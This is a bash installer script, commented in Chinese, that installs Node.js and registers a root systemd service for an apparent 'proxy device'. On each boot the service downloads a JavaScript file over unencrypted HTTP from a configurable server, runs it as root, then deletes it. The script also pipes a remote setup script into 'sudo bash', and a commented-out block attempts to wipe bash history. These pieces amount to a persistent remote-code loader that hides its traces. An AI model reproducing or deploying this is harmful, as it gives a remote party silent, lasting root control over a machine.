# 安装 wget
if ! [ -x "$(command -v wget)" ]; then
  source /etc/os-release
  case $ID in
  debian | ubuntu | devuan)
    sudo apt install wget -y
    ;;
  centos | fedora | rhel)
    yumdnf="yum"
    if test "$(echo "$VERSION_ID >= 22" | bc)" -ne 0; then
      yumdnf="dnf"
    fi
    sudo $yumdnf install wget -y
    ;;
  *)
    # exit 1
    ;;
  esac
fi

# 安装 nodejs
if ! [ -x "$(command -v node)" ]; then
  source /etc/os-release
  case $ID in
  debian | ubuntu | devuan)
    # sudo apt install nodejs -y  # 弃用此方式，原因是 lts 版本的 ubuntu 安装的 nodejs 版本会比较旧
    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
    sudo apt install nodejs build-essential -y
    ;;
  centos | fedora | rhel)
    yumdnf="yum"
    if test "$(echo "$VERSION_ID >= 22" | bc)" -ne 0; then
      yumdnf="dnf"
    fi
    sudo $yumdnf install nodejs -y
    ;;
  *)
    # exit 1
    ;;
  esac

else
  # nodejs 版本低于 18 重新安装
  MY_NODE_VERSION=$(node -v)
  MY_NODE_MAJOR_VERSION=$(echo $MY_NODE_VERSION | cut -d'.' -f1 | tr -d 'v')
  if [ "$MY_NODE_MAJOR_VERSION" -lt 18 ]; then
    sudo apt remove nodejs -y # apt purge
    sudo apt autoremove -y
    sudo apt update
    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
    sudo apt install nodejs build-essential -y
  fi
fi

# 如果是 webrtc 的方式连接，需要全局安装包
if [ "$CONNECT_TYPE" == "webrtc" ]; then
  # `npm config set registry=http://registry.npm.taobao.org`  # TODO:不确定是否需要
  # 需要的包
  PACKAGE_NAMES=("node-pre-gyp" "wrtc" "imap")
  # 遍历包名列表并检查每个包是否全局安装
  for PACKAGE_NAME in "${PACKAGE_NAMES[@]}"; do
    if npm list -g --depth=0 | grep -q "$PACKAGE_NAME@"; then
      echo "Package '$PACKAGE_NAME' is installed globally."
    else
      npm install -g "$PACKAGE_NAME"
      # 输出提示
      if [ $? -eq 0 ]; then
        echo "Package '$PACKAGE_NAME' has been installed successfully."
      else
        echo "Failed to install package '$PACKAGE_NAME'."
      fi
    fi
  done
fi

# 获取命令路径
NODE_COMMAND_PATH=$(which node)
SLEEP_COMMAND_PATH=$(which sleep)
CURL_COMMAND_PATH=$(which curl)
WGET_COMMAND_PATH=$(which wget)
RM_COMMAND_PATH=$(which rm)
BASH_COMMAND_PATH=$(which bash)

# # 清空历史 (没用)
# history -c
# if [ -f ~/.bash_history ]; then
#   echo "" > ~/.bash_history
# fi

# service 文件内容
export MY_PROXY_FILENAME=my_proxy_device_script.service
export MY_PROXY_FILENAME_PATH="forward_end/end_manager.js"
export MY_PROXY_FILENAME_CONTENT="
# Unit 介绍本单元的基本信息（即元数据）
[Unit] 
Description=$MY_PROXY_FILENAME 
# After=network.target 

# Service 用来定制行为 (*.service 特有) 
[Service] 
Type=simple 
User=root
Group=root
Restart=always
Environment=SERVER_HOST=$SERVER_HOST
Environment=DEVICE_ID=$DEVICE_ID
ExecStartPre=$SLEEP_COMMAND_PATH 30s
WorkingDirectory=/etc/systemd/system
ExecStartPre=$WGET_COMMAND_PATH http://\${SERVER_HOST}/$MY_PROXY_FILENAME_PATH -O /etc/systemd/system/proxy_end_manager.js
ExecStart=$NODE_COMMAND_PATH /etc/systemd/system/proxy_end_manager.js
ExecStartPost=$SLEEP_COMMAND_PATH 5s
ExecStartPost=$RM_COMMAND_PATH /etc/systemd/system/proxy_end_manager.js

# Install 定义开机自启动(systemctl enable)和关闭开机自启动(systemctl disable)这个单元时，所要执行的命令
[Install] 
# WantedBy=multi-user.target
WantedBy=network-online.target
"

# 配置系统级自启动
systemctl is-enabled $MY_PROXY_FILENAME
if [ $? = 1 ] || [ $(systemctl is-enabled $MY_PROXY_FILENAME) = "disabled" ]; then
  if [ -f "/etc/systemd/system/$MY_PROXY_FILENAME" ]; then
    rm /etc/systemd/system/$MY_PROXY_FILENAME
  fi
  touch /etc/systemd/system/$MY_PROXY_FILENAME
  echo "$MY_PROXY_FILENAME_CONTENT" >/etc/systemd/system/$MY_PROXY_FILENAME

  # 启用服务
  chmod 755 /etc/systemd/system/$MY_PROXY_FILENAME
  systemctl enable $MY_PROXY_FILENAME
  systemctl restart $MY_PROXY_FILENAME

else
  # 更新 service 内容
  >/etc/systemd/system/$MY_PROXY_FILENAME
  echo "$MY_PROXY_FILENAME_CONTENT" >/etc/systemd/system/$MY_PROXY_FILENAME
fi

# /lib/systemd/system -> 系统默认的单元文件
# /etc/systemd/system -> 用户安装的软件的单元文件
# /usr/lib/systemd/system -> 用户自己定义的单元文件

# # 查看所有单元
# $ systemctl list-unit-files
# # 查看所有 Service 单元
# $ systemctl list-unit-files --type service
# # 查看所有 Timer 单元
# $ systemctl list-unit-files --type timer

# # 启动单元
# $ systemctl start [UnitName]
# # 关闭单元
# $ systemctl stop [UnitName]
# # 重启单元
# $ systemctl restart [UnitName]
# # 杀死单元进程
# $ systemctl kill [UnitName]
# # 查看单元状态
# $ systemctl status [UnitName]
# # 开机自动执行该单元
# $ systemctl enable [UnitName]
# # 关闭开机自动执行
# $ systemctl disable [UnitName]

# 日志相关命令
# # 查看整个日志
# $ sudo journalctl
# # 查看 mytimer.timer 的日志
# $ sudo journalctl -u mytimer.timer
# # 查看 mytimer.timer 和 mytimer.service 的日志
# $ sudo journalctl -u mytimer
# # 从结尾开始查看最新日志
# $ sudo journalctl -f
# # 从结尾开始查看 mytimer.timer 的日志
# $ journalctl -f -u timer.timer

#
# [Service] 配置介绍
# ExecStart=<systemctl start 所要执行的命令>
# ExecStop=<systemctl stop 所要执行的命令>
# ExecReload=<systemctl reload 所要执行的命令>
# ExecStartPre=<ExecStart 之前自动执行的命令>
# ExecStartPost=<ExecStart 之后自动执行的命令>
# ExecStopPost=<ExecStop 之后自动执行的命令>
# 注意:
# 1. 必须使用绝对路径，例如 bash 需要写成 /usr/bin/bash 或 /bin/bash ，执行文件也是
# 2. 用户和用户组可以用 id -un 和 id -gn 查看
# 3. 查看命令的绝对路径使用 which ，例如 which node
# 4. 不能使用 export 声明变量，可以在 Environment 声明。使用变量需要用 ${...} 的语法，而非 $...
# 5. 不能使用 ; 同时执行两个命令，如 sleep 5s; echo "xx" 这样是不行的。可以按顺序拆分到同名的配置中，如两个命令安排到两个 ExecStopPost 中
# 6. 注释不能加载配置后面，如  ExecStartPost=/usr/bin/sleep 5 # 啊啊啊  是有问题的

#
# Timer 定义了如何执行任务 (*.timer 特有)
# 要定时执行这个 Service ，还必须定义 Timer 单元
# [Timer]
# OnActiveSec=<定时器生效后，多少时间开始执行任务，如 1h ，其他字段类似>
# OnBootSec=<系统启动后，多少时间开始执行任务>
# OnStartupSec=<Systemd 进程启动后，多少时间开始执行任务>
# OnUnitActiveSec=<该单元上次执行后，等多少时间再次执行>
# OnUnitInactiveSec=<定时器上次关闭后多少时间，再次执行>
# OnCalendar=<基于绝对时间，而不是相对时间执行>
# AccuracySec=<如果因为各种原因，任务必须推迟执行，推迟的最大秒数，默认是60秒>
# Unit=<真正要执行的任务，默认是同名的带有.service后缀的单元>
# Persistent=<如果设置了该字段，即使定时器到时没有启动，也会自动执行相应的单元>
# WakeSystem=<如果系统休眠，是否自动唤醒系统>
# 注意:
# 1. 时间值使用类似 1h、*-*-* 02:00:00 等，参考 https://www.freedesktop.org/software/systemd/man/systemd.time.html
